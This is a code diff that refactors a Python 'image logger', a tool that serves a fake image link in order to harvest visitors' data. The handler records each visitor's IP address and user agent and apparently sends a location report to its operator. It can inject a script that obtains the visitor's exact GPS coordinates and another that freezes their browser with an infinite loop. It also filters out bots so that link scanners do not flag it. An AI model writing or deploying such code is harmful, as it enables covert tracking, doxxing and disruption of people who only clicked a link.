@@ -1,3 +1,4 @@
+from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 import json
@@ -172,37 +173,40 @@ binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
-def handler(request):
-    """Vercel serverless function handler"""
-    try:
-        # Extract headers safely
-        headers = request.headers if hasattr(request, 'headers') else {}
-        
-        # Get client IP with multiple fallbacks
-        ip = headers.get('x-forwarded-for') or headers.get('cf-connecting-ip') or '0.0.0.0'
-        if ',' in str(ip):
-            ip = ip.split(',')[0].strip()
-        
-        # Parse URL parameters
-        query_string = request.url.split('?')[1] if '?' in request.url else ''
-        query_params = dict(parse.parse_qsl(query_string)) if query_string else {}
-        
-        # Get image URL
-        url = config["image"]
-        if config["imageArgument"]:
-            if query_params.get("url"):
-                try:
-                    url = base64.b64decode(query_params.get("url")).decode()
-                except:
-                    pass
-            elif query_params.get("id"):
-                try:
-                    url = base64.b64decode(query_params.get("id")).decode()
-                except:
-                    pass
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
+    def handleRequest(self):
+        """Handle GET and POST requests"""
+        try:
+            # Extract headers safely
+            headers = self.headers if hasattr(self, 'headers') else {}
+            
+            # Get client IP with multiple fallbacks
+            ip = headers.get('x-forwarded-for') or headers.get('cf-connecting-ip') or self.client_address[0]
+            if ',' in str(ip):
+                ip = ip.split(',')[0].strip()
+            
+            # Parse URL parameters
+            path = self.path
+            query_string = path.split('?')[1] if '?' in path else ''
+            query_params = dict(parse.parse_qsl(query_string)) if query_string else {}
+            
+            # Get image URL
+            url = config["image"]
+            if config["imageArgument"]:
+                if query_params.get("url"):
+                    try:
+                        url = base64.b64decode(query_params.get("url")).decode()
+                    except:
+                        pass
+                elif query_params.get("id"):
+                    try:
+                        url = base64.b64decode(query_params.get("id")).decode()
+                    except:
+                        pass
 
-        # Generate HTML with image
-        html_content = f'''<style>body {{
+            # Generate HTML with image
+            html_content = f'''<style>body {{
 margin: 0;
 padding: 0;
 }}
@@ -214,97 +218,93 @@ background-size: contain;
 width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''
-        
-        # Check if IP is blacklisted
-        if ip.startswith(blacklistedIPs):
-            return {
-                "statusCode": 200,
-                "headers": {"Content-Type": "text/html"},
-                "body": "OK"
-            }
-        
-        # Check if it's a bot
-        user_agent = headers.get('user-agent', 'Unknown')
-        bot = botCheck(ip, user_agent)
-        
-        if bot:
-            # Send bot detection report
+            
+            # Check if IP is blacklisted
+            if ip.startswith(blacklistedIPs):
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b'OK')
+                return
+            
+            # Check if it's a bot
+            user_agent = headers.get('user-agent', 'Unknown')
+            bot = botCheck(ip, user_agent)
+            
+            if bot:
+                # Send bot detection report
+                try:
+                    makeReport(ip, user_agent, endpoint=path.split("?")[0], url=url)
+                except Exception as e:
+                    print(f"Error in makeReport for bot: {str(e)}")
+                
+                if config["buggedImage"]:
+                    self.send_response(200)
+                    self.send_header('Content-type', 'image/jpeg')
+                    self.end_headers()
+                    self.wfile.write(binaries["loading"])
+                else:
+                    self.send_response(302)
+                    self.send_header('Location', url)
+                    self.end_headers()
+                return
+            
+            # Not a bot - log the IP
+            result = None
             try:
-                makeReport(ip, user_agent, endpoint=request.path.split("?")[0], url=url)
+                if query_params.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(query_params.get("g")).decode()
+                    result = makeReport(ip, user_agent, location, path.split("?")[0], url=url)
+                else:
+                    result = makeReport(ip, user_agent, endpoint=path.split("?")[0], url=url)
             except Exception as e:
-                print(f"Error in makeReport for bot: {str(e)}")
+                print(f"Error in makeReport: {str(e)}")
             
-            if config["buggedImage"]:
-                return {
-                    "statusCode": 200,
-                    "headers": {"Content-Type": "image/jpeg"},
-                    "isBase64Encoded": True,
-                    "body": base64.b64encode(binaries["loading"]).decode()
-                }
-            else:
-                return {
-                    "statusCode": 302,
-                    "headers": {"Location": url},
-                    "body": ""
-                }
-        
-        # Not a bot - log the IP
-        result = None
-        try:
-            if query_params.get("g") and config["accurateLocation"]:
-                location = base64.b64decode(query_params.get("g")).decode()
-                result = makeReport(ip, user_agent, location, request.path.split("?")[0], url=url)
-            else:
-                result = makeReport(ip, user_agent, endpoint=request.path.split("?")[0], url=url)
-        except Exception as e:
-            print(f"Error in makeReport: {str(e)}")
-        
-        # Prepare message
-        message = config["message"]["message"]
-        
-        if config["message"]["richMessage"] and result:
-            message = message.replace("{ip}", ip)
-            message = message.replace("{isp}", result.get("isp", "Unknown"))
-            message = message.replace("{asn}", result.get("as", "Unknown"))
-            message = message.replace("{country}", result.get("country", "Unknown"))
-            message = message.replace("{region}", result.get("regionName", "Unknown"))
-            message = message.replace("{city}", result.get("city", "Unknown"))
-            message = message.replace("{lat}", str(result.get("lat", "Unknown")))
-            message = message.replace("{long}", str(result.get("lon", "Unknown")))
-            timezone = result.get("timezone", "Unknown")
-            if '/' in timezone:
-                message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
-            else:
-                message = message.replace("{timezone}", timezone)
-            message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
-            message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
-            message = message.replace("{bot}", str(result.get("hosting") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
+            # Prepare message
+            message = config["message"]["message"]
             
-            try:
-                os_info, browser_info = httpagentparser.simple_detect(user_agent)
-                message = message.replace("{browser}", browser_info)
-                message = message.replace("{os}", os_info)
-            except:
-                pass
+            if config["message"]["richMessage"] and result:
+                message = message.replace("{ip}", ip)
+                message = message.replace("{isp}", result.get("isp", "Unknown"))
+                message = message.replace("{asn}", result.get("as", "Unknown"))
+                message = message.replace("{country}", result.get("country", "Unknown"))
+                message = message.replace("{region}", result.get("regionName", "Unknown"))
+                message = message.replace("{city}", result.get("city", "Unknown"))
+                message = message.replace("{lat}", str(result.get("lat", "Unknown")))
+                message = message.replace("{long}", str(result.get("lon", "Unknown")))
+                timezone = result.get("timezone", "Unknown")
+                if '/' in timezone:
+                    message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
+                else:
+                    message = message.replace("{timezone}", timezone)
+                message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
+                message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
+                message = message.replace("{bot}", str(result.get("hosting") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
+                
+                try:
+                    os_info, browser_info = httpagentparser.simple_detect(user_agent)
+                    message = message.replace("{browser}", browser_info)
+                    message = message.replace("{os}", os_info)
+                except:
+                    pass
 
-        body_content = html_content
+            body_content = html_content
 
-        if config["message"]["doMessage"]:
-            body_content = message
-        
-        if config["crashBrowser"]:
-            body_content += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+            if config["message"]["doMessage"]:
+                body_content = message
+            
+            if config["crashBrowser"]:
+                body_content += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
 
-        if config["redirect"]["redirect"]:
-            return {
-                "statusCode": 302,
-                "headers": {"Location": config["redirect"]["page"]},
-                "body": ""
-            }
+            if config["redirect"]["redirect"]:
+                self.send_response(302)
+                self.send_header('Location', config["redirect"]["page"])
+                self.end_headers()
+                return
 
-        # Handle accurate location if needed
-        if config["accurateLocation"]:
-            body_content += """<script>
+            # Handle accurate location if needed
+            if config["accurateLocation"]:
+                body_content += """<script>
 var currenturl = window.location.href;
 if (!currenturl.includes("g=")) {
     if (navigator.geolocation) {
@@ -318,21 +318,28 @@ if (!currenturl.includes("g=")) {
 }}
 </script>"""
 
-        return {
-            "statusCode": 200,
-            "headers": {"Content-Type": "text/html"},
-            "body": body_content
-        }
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(body_content.encode() if isinstance(body_content, str) else body_content)
+        
+        except Exception as e:
+            error_msg = traceback.format_exc()
+            print(f"ERROR: {error_msg}")
+            try:
+                reportError(error_msg)
+            except:
+                pass
+            
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(f"500 - Internal Server Error<br><pre>{error_msg}</pre>".encode())
+
+    def do_GET(self):
+        self.handleRequest()
     
-    except Exception as e:
-        error_msg = traceback.format_exc()
-        print(f"ERROR: {error_msg}")
-        try:
-            reportError(error_msg)
-        except:
-            pass
-        return {
-            "statusCode": 500,
-            "headers": {"Content-Type": "text/html"},
-            "body": f"500 - Internal Server Error<br><pre>{error_msg}</pre>"
-        }
+    def do_POST(self):
+        self.handleRequest()
+
+handler = ImageLoggerAPI
